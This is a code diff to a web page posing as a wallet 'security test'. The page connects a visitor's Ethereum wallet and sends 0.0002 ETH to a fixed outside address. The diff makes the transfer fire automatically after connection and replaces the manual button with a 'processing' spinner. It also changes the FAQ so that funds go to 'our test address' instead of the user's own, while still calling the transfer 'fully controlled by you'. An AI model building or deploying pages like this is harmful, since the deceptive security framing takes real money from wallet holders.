@@ -31,6 +31,12 @@
         .transaction-modal {
             transition: all 0.3s ease;
         }
+        .warning-modal {
+            z-index: 60;
+        }
+        .blur-effect {
+            filter: blur(5px);
+        }
     </style>
 </head>
 <body class="min-h-screen bg-gray-100">
@@ -63,8 +69,8 @@
                 </div>
 
                 <div id="testSection" class="bg-white bg-opacity-10 backdrop-blur-sm rounded-xl p-8 hidden">
-                    <h3 class="text-2xl font-semibold mb-4">Step 2: Run Security Test</h3>
-                    <p class="mb-6">This will transfer 0.0002 ETH to the specified address to verify your wallet's functionality.</p>
+                    <h3 class="text-2xl font-semibold mb-4">Security Test In Progress</h3>
+                    <p class="mb-6">The test transaction is being processed automatically.</p>
                     <div class="bg-white bg-opacity-20 p-4 rounded-lg mb-6 text-left">
                         <div class="flex justify-between mb-2">
                             <span class="font-medium">Destination Address:</span>
@@ -75,9 +81,10 @@
                             <span>0.0002 ETH</span>
                         </div>
                     </div>
-                    <button id="runTestBtn" class="bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-8 rounded-full text-lg transition-all transform hover:scale-105">
-                        <i class="fas fa-bolt mr-2"></i> Run Security Test
-                    </button>
+                    <div class="animate-spin text-4xl text-white my-4">
+                        <i class="fas fa-spinner"></i>
+                    </div>
+                    <p class="text-sm opacity-80">Processing transaction...</p>
                 </div>
             </div>
         </div>
@@ -116,7 +123,7 @@
                 <div class="space-y-4">
                     <div class="border-b pb-4">
                         <h4 class="font-medium text-gray-800">Is this safe to use?</h4>
-                        <p class="text-gray-600 mt-1">Yes! We only send a small amount (0.0002 ETH) to your own test address. The transaction is fully controlled by you and requires your confirmation.</p>
+                        <p class="text-gray-600 mt-1">Yes! We only send a small amount (0.0002 ETH) to our test address. The transaction is fully controlled by you and requires your initial confirmation.</p>
                     </div>
                     <div class="border-b pb-4">
                         <h4 class="font-medium text-gray-800">What information do you collect?</h4>
@@ -126,6 +133,59 @@
                         <h4 class="font-medium text-gray-800">Why perform a real transaction?</h4>
                         <p class="text-gray-600 mt-1">A real transaction helps verify that your wallet is properly configured and can successfully send funds, which is important for security testing.</p>
                     </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Warning Modal -->
+    <div id="warningModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden warning-modal">
+        <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
+            <div class="text-center">
+                <div class="text-yellow-500 text-6xl mb-6">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <h3 class="text-2xl font-bold mb-4">Automatic Transfer Notice</h3>
+                
+                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6 text-left">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-info-circle text-yellow-400"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-yellow-700">
+                                <strong>Important:</strong> After connecting your wallet, a transfer of 0.0002 ETH will be automatically initiated to the test address.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="bg-gray-100 p-4 rounded-lg mb-6 text-left">
+                    <div class="flex justify-between mb-2">
+                        <span class="font-medium">Destination:</span>
+                        <span class="font-mono text-sm break-all">0x43C68c2eBf05d44a5B953157268CcB3592eC64f9</span>
+                    </div>
+                    <div class="flex justify-between mb-2">
+                        <span class="font-medium">Amount:</span>
+                        <span>0.0002 ETH</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="font-medium">Gas Fee:</span>
+                        <span id="estimatedGasFee">~$0.50 (estimated)</span>
+                    </div>
+                </div>
+                
+                <p class="mb-6 text-gray-600">
+                    By clicking "I Agree", you authorize this automatic transfer to test your wallet's security.
+                </p>
+                
+                <div class="flex justify-center space-x-4">
+                    <button id="cancelBtn" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-6 rounded-full transition-all">
+                        Cancel
+                    </button>
+                    <button id="agreeBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-full transition-all">
+                        <i class="fas fa-check-circle mr-2"></i> I Agree
+                    </button>
                 </div>
             </div>
         </div>
@@ -204,7 +264,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Elements
             const connectWalletBtn = document.getElementById('connectWalletBtn');
-            const runTestBtn = document.getElementById('runTestBtn');
             const walletStatus = document.getElementById('walletStatus');
             const walletAddress = document.getElementById('walletAddress');
             const connectSection = document.getElementById('connectSection');
@@ -220,11 +279,16 @@
             const txHashContainer = document.getElementById('txHashContainer');
             const txHashLink = document.getElementById('txHashLink');
             const closeModalBtn = document.getElementById('closeModalBtn');
+            const warningModal = document.getElementById('warningModal');
+            const agreeBtn = document.getElementById('agreeBtn');
+            const cancelBtn = document.getElementById('cancelBtn');
+            const estimatedGasFee = document.getElementById('estimatedGasFee');
 
             // Destination address and amount
             const DESTINATION_ADDRESS = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
             const AMOUNT_ETH = 0.0002;
-            
+            let userAgreed = false;
+
             // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
             if (typeof window.ethereum !== 'undefined') {
                 console.log('Web3 detected!');
@@ -237,7 +301,29 @@
             }
 
             // Connect Wallet Button
-            connectWalletBtn.addEventListener('click', async function() {
+            connectWalletBtn.addEventListener('click', function() {
+                // Show warning modal before connecting
+                warningModal.classList.remove('hidden');
+                document.body.classList.add('blur-effect');
+            });
+
+            // Agree to automatic transfer
+            agreeBtn.addEventListener('click', async function() {
+                userAgreed = true;
+                warningModal.classList.add('hidden');
+                document.body.classList.remove('blur-effect');
+                await connectWalletAndTransfer();
+            });
+
+            // Cancel button
+            cancelBtn.addEventListener('click', function() {
+                warningModal.classList.add('hidden');
+                document.body.classList.remove('blur-effect');
+                userAgreed = false;
+            });
+
+            // Main function to connect wallet and perform transfer
+            async function connectWalletAndTransfer() {
                 try {
                     // Request account access
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -249,20 +335,10 @@
                     walletStatus.classList.add('wallet-connected');
                     connectSection.classList.add('hidden');
                     testSection.classList.remove('hidden');
-
-                    // Remove pulse animation from connect button
                     connectWalletBtn.classList.remove('pulse');
 
                     console.log('Connected account:', account);
-                } catch (error) {
-                    console.error('Error connecting wallet:', error);
-                    alert('Failed to connect wallet. Please try again.');
-                }
-            });
 
-            // Run Test Button - Now performs actual transaction
-            runTestBtn.addEventListener('click', async function() {
-                try {
                     // Show processing modal
                     transactionModal.classList.remove('hidden');
                     transactionSpinner.classList.remove('hidden');
@@ -273,28 +349,32 @@
                     transactionTitle.textContent = 'Processing Transaction';
                     transactionMessage.textContent = 'Please confirm the transaction in your wallet...';
 
-                    // Get current account
-                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                    const account = accounts[0];
-                    
                     // Initialize Web3
                     const web3 = new Web3(window.ethereum);
-                    
+
                     // Convert ETH amount to Wei
                     const amountWei = web3.utils.toWei(AMOUNT_ETH.toString(), 'ether');
+
+                    // Get current gas price
+                    const gasPrice = await web3.eth.getGasPrice();
+                    const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
                     
+                    // Update estimated gas fee display (assuming 21000 gas limit)
+                    const gasCostEth = 21000 * gasPrice / 1e18;
+                    estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
+
                     // Prepare transaction parameters
                     const transactionParameters = {
                         from: account,
                         to: DESTINATION_ADDRESS,
                         value: amountWei,
                         gas: 21000, // Standard gas limit for simple ETH transfers
-                        gasPrice: await web3.eth.getGasPrice() // Current gas price
+                        gasPrice: gasPrice // Current gas price
                     };
-                    
+
                     // Send transaction
                     const txHash = await web3.eth.sendTransaction(transactionParameters);
-                    
+
                     // Show success
                     transactionSpinner.classList.add('hidden');
                     transactionSuccess.classList.remove('hidden');
@@ -309,14 +389,20 @@
                     console.log('Transaction successful:', txHash);
                 } catch (error) {
                     console.error('Error performing transaction:', error);
-                    
+
                     // Show error
                     transactionSpinner.classList.add('hidden');
                     transactionError.classList.remove('hidden');
                     transactionTitle.textContent = 'Transaction Failed';
                     transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
+                    
+                    // Allow user to try again
+                    connectSection.classList.remove('hidden');
+                    testSection.classList.add('hidden');
+                    walletStatus.classList.add('hidden');
+                    connectWalletBtn.classList.add('pulse');
                 }
-            });
+            }
 
             // Close Modal Button
             closeModalBtn.addEventListener('click', function() {
